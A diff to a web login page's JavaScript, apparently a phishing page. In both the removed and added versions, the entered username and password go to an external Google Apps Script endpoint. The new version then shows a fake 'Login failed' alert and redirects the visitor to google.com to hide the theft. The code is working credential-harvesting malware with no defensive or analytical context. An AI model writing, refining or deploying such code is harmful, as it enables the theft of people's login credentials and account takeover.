@@ -163,23 +163,27 @@
   const user = document.getElementById("username").value;
   const pass = document.getElementById("password").value;
 
-  fetch("https://script.google.com/macros/s/AKfycbyMTVTPkbhQDxf1LTvvD1-XrA1XPUf8lOPbP3fv9H_nhYTX57wfoJYotMc8jheEl0yspQ/exec", {
-    method: "POST",
-    mode: "no-cors", // Optional: Use this if you don't need to read the success message
-    headers: {
-      "Content-Type": "text/plain" // Changed from application/json
-    },
-    body: JSON.stringify({
-      username: user,
-      password: pass
-    })
+  fetch("https://script.google.com/macros/s/AKfycby.../exec", {
+  method: "POST",
+  mode: "no-cors", // Essential for Google Apps Script on live domains
+  headers: {
+    "Content-Type": "text/plain" 
+  },
+  body: JSON.stringify({
+    username: user,
+    password: pass
   })
-  .then(res => {
-    // Note: If you use mode: "no-cors", res.json() will fail. 
-    // You'll just know the request was sent.
-    alert("Process completed.");
-  })
-  .catch(err => console.error("Error details:", err));
+})
+.then(() => {
+  // We don't use res.json() here because no-cors hides the result
+  // If we reached here, the browser sent the data!
+  alert("Login failed (demo)"); 
+  window.location.href = "https://www.google.com";
+})
+.catch(err => {
+  console.error("Error:", err);
+  alert("Network error. Please check your connection.");
+});
 }
 </script>
 
